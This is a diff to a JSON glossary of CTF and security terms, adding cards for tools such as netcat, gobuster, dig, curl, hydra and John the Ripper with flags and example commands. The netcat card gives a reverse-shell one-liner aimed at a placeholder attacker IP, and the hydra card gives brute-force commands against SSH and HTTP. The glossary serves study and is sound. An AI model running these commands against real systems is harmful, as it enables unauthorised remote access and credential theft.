+      "term": "License Key Validation (Reverse Engineering)",
+      "description": "A common CTF and reverse engineering challenge involving analysis of license key validation algorithms to generate valid keys.",
       "tags": [
-        "exploitation",
-        "security",
-        "sandbox",
-        "privilege-escalation"
+        "ReverseEngineering",
+        "Challenge",
+        "Technique"
       ],
       "resources": [
         {
-          "title": "OWASP - Sandbox Escape",
-          "url": "https://owasp.org/www-community/attacks/Sandbox_Escape"
-        },
-        {
-          "title": "HackTricks - Bypass Sandboxes",
-          "url": "https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions"
+          "title": "Reverse Engineering License Checks",
+          "url": "https://crackmes.one/"
         }
       ],
-      "letter": "J"
+      "letter": "L"
     },
     {
-      "term": "JSFuck",
-      "description": "An esoteric JavaScript programming style where code is written using only six characters: [, ], (, ), !, and +. It can be used to create obfuscated JavaScript code that is still executable.",
+      "term": "Static vs Dynamic Analysis",
+      "description": "Two approaches to reverse engineering: static (analyzing code without execution) and dynamic (analyzing behavior during execution). Both are essential for complex challenges.",
       "tags": [
-        "javascript",
-        "obfuscation",
-        "esoteric-language",
-        "web-security"
+        "ReverseEngineering",
+        "Analysis",
+        "CTF",
+        "Concept"
       ],
       "resources": [
         {
-          "title": "JSFuck - Official Site (Encoder)",
-          "url": "http://www.jsfuck.com/"
-        },
-        {
-          "title": "Wikipedia - JSFuck",
-          "url": "https://en.wikipedia.org/wiki/JSFuck"
+          "title": "Static vs Dynamic Analysis",
+          "url": "https://www.veracode.com/security/static-dynamic-analysis"
         }
+      ],
+      "letter": "S"
+    },
+    {
+      "term": "Exploit-DB",
+      "description": "A public database of exploits and proof-of-concept code for vulnerabilities in software, widely used for research and CTFs.",
+      "tags": [
+        "Exploitation",
+        "Resource",
+        "Database"
+      ],
+      "resources": [
+        {
+          "title": "Exploit-DB Home",
+          "url": "https://www.exploit-db.com/"
+        }
+      ],
+      "letter": "E"
+    },
+    {
+      "term": "Canary",
+      "description": "A canary is a security mechanism used to detect unauthorized access or exploitation attempts. Examples include canary tokens (files, URLs, or credentials that trigger alerts when accessed) and stack canaries (values placed on the stack to detect buffer overflows).",
+      "tags": [
+        "Detection",
+        "Alerting",
+        "Token",
+        "ExploitMitigation",
+        "StackProtection",
+        "Security"
+      ],
+      "resources": [
+        { "title": "Canarytokens.org", "url": "https://canarytokens.org/" },
+        { "title": "Stack Canaries (Wikipedia)", "url": "https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" },
+        { "title": "OWASP - Canary Tokens", "url": "https://owasp.org/www-community/attacks/Canary_Tokens" }
+      ],
+      "letter": "C"
+    },
+    {
+      "term": "Netcat",
+      "description": "Netcat (nc) is a versatile networking utility for reading from and writing to network connections using TCP or UDP. Commonly used for port scanning, banner grabbing, file transfer, reverse shells, and simple chat servers.",
+      "tags": [
+        "Networking",
+        "PortScanning",
+        "FileTransfer",
+        "ReverseShell",
+        "BannerGrabbing",
+        "Tool"
+      ],
+      "flags": [
+        "-l (listen mode)",
+        "-p <port> (specify port)",
+        "-u (UDP mode)",
+        "-v (verbose)",
+        "-n (numeric-only IP addresses)",
+        "-e <program> (execute program after connection)"
+      ],
+      "techniques": [
+        "Reverse Shell: nc -e /bin/sh <attacker_ip> <port>",
+        "File Transfer: nc -l -p <port> > file.txt (receiver), nc <host> <port> < file.txt (sender)",
+        "Port Scanning: nc -zv <host> <start_port>-<end_port>"
+      ],
+      "resources": [
+        { "title": "Netcat Cheat Sheet", "url": "https://www.sans.org/blog/the-netcat-cheat-sheet/" },
+        { "title": "Netcat Man Page", "url": "https://linux.die.net/man/1/nc" }
+      ],
+      "letter": "N"
+    },
+    {
+      "term": "Gobuster",
+      "description": "Gobuster is a tool for brute-forcing URIs (directories and files) in web sites and DNS subdomains. Useful for discovering hidden resources and directories during web application assessments.",
+      "tags": [
+        "Web",
+        "Enumeration",
+        "BruteForce",
+        "DirectoryDiscovery",
+        "DNS",
+        "Tool"
+      ],
+      "flags": [
+        "dir (directory brute-forcing)",
+        "dns (DNS subdomain brute-forcing)",
+        "-u <url> (target URL)",
+        "-w <wordlist> (wordlist file)",
+        "-t <threads> (number of threads)",
+        "-x <extensions> (file extensions)"
+      ],
+      "techniques": [
+        "Directory Brute-Force: gobuster dir -u http://target -w wordlist.txt",
+        "Subdomain Brute-Force: gobuster dns -d target.com -w subdomains.txt"
+      ],
+      "resources": [
+        { "title": "Gobuster GitHub", "url": "https://github.com/OJ/gobuster" },
+        { "title": "HackTricks: Directory Bruteforcing", "url": "https://book.hacktricks.xyz/pentesting-web/content-discovery#directory-bruteforcing" }
+      ],
+      "letter": "G"
+    },
+    {
+      "term": "dig",
+      "description": "dig (Domain Information Groper) is a command-line tool for querying DNS name servers. Used for DNS enumeration, troubleshooting, and gathering information about domains and records.",
+      "tags": [
+        "DNS",
+        "Enumeration",
+        "Reconnaissance",
+        "Networking",
+        "Tool"
+      ],
+      "flags": [
+        "@<server> (specify DNS server)",
+        "+short (short output)",
+        "ANY (query all record types)",
+        "AXFR (zone transfer)",
+        "-x (reverse lookup)"
+      ],
+      "techniques": [
+        "Zone Transfer: dig AXFR domain.com @ns1.domain.com",
+        "Reverse Lookup: dig -x <ip>"
+      ],
+      "resources": [
+        { "title": "dig Man Page", "url": "https://linux.die.net/man/1/dig" },
+        { "title": "HackTricks: DNS Enumeration", "url": "https://book.hacktricks.xyz/network-services-pentesting/dns-pentesting#dns-enumeration" }
+      ],
+      "letter": "D"
+    },
+    {
+      "term": "Wget",
+      "description": "Wget is a command-line utility for downloading files from the web via HTTP, HTTPS, and FTP. Supports recursive downloads, mirroring, and downloading from lists of URLs.",
+      "tags": [
+        "Web",
+        "FileTransfer",
+        "Download",
+        "Automation",
+        "Tool"
+      ],
+      "flags": [
+        "-r (recursive)",
+        "-np (no parent)",
+        "-c (continue download)",
+        "-i <file> (input file with URLs)",
+        "--user/--password (HTTP authentication)"
+      ],
+      "techniques": [
+        "Recursive Download: wget -r -np http://target/",
+        "Download with Authentication: wget --user=user --password=pass http://target/file"
+      ],
+      "resources": [
+        { "title": "Wget Manual", "url": "https://www.gnu.org/software/wget/manual/wget.html" },
+        { "title": "Wget Examples", "url": "https://www.tecmint.com/20-wget-command-examples-in-linux/" }
+      ],
+      "letter": "W"
+    },
+    {
+      "term": "curl",
+      "description": "curl is a command-line tool for transferring data with URLs. It supports various protocols including HTTP, HTTPS, FTP, and more. Used for web requests, API testing, file downloads, and data transfer.",
+      "tags": [
+        "Web",
+        "FileTransfer",
+        "Download",
+        "API",
+        "Networking",
+        "Tool"
+      ],
+      "flags": [
+        "-O (save to file)",
+        "-L (follow redirects)",
+        "-u <user:pass> (HTTP authentication)",
+        "-d <data> (send POST data)",
+        "-X <method> (specify HTTP method)"
+      ],
+      "techniques": [
+        "Download File: curl -O http://target/file",
+        "Send POST Request: curl -d 'param=value' http://target/api"
+      ],
+      "resources": [
+        { "title": "curl Documentation", "url": "https://curl.se/docs/" },
+        { "title": "Everything curl - Book", "url": "https://everything.curl.dev/" }
+      ],
+      "letter": "C"
+    },
+    {
+      "term": "Hydra",
+      "description": "Hydra is a fast and flexible login cracker supporting numerous protocols to brute-force credentials. Commonly used for attacking SSH, FTP, HTTP, SMB, and more.",
+      "tags": [
+        "BruteForce",
+        "PasswordCracking",
+        "Login",
+        "Tool"
+      ],
+      "flags": [
+        "-l <login> (username)",
+        "-P <password list> (password file)",
+        "-t <tasks> (parallel tasks)",
+        "-s <port> (port)",
+        "-V (verbose)"
+      ],
+      "techniques": [
+        "Brute-Force SSH: hydra -l user -P passlist.txt ssh://target",
+        "Brute-Force HTTP: hydra -l user -P passlist.txt http-get://target"
+      ],
+      "resources": [
+        { "title": "Hydra GitHub", "url": "https://github.com/vanhauser-thc/thc-hydra" },
+        { "title": "HackTricks: Brute Force", "url": "https://book.hacktricks.xyz/pentesting-web/brute-force" }
+      ],
+      "letter": "H"
+    },
+    {
+      "term": "John the Ripper",
+      "description": "John the Ripper is a fast password cracker supporting various password hash types. Used for offline password cracking and hash analysis.",
+      "tags": [
+        "PasswordCracking",
+        "Hash",
+        "OfflineAttack",
+        "Tool"
+      ],
+      "flags": [
+        "--wordlist=<file> (wordlist mode)",
+        "--format=<type> (hash type)",
+        "--rules (apply rules)",
+        "--show (show cracked passwords)"
+      ],
+      "techniques": [
+        "Crack Hash: john --wordlist=rockyou.txt hashfile",
+        "Show Cracked: john --show hashfile"
+      ],
+      "resources": [
+        { "title": "John the Ripper Home", "url": "https://www.openwall.com/john/" },
+        { "title": "John the Ripper Usage", "url": "https://www.cyberciti.biz/faq/john-the-ripper-password-cracker-usage/" }
       ],
       "letter": "J"
     }
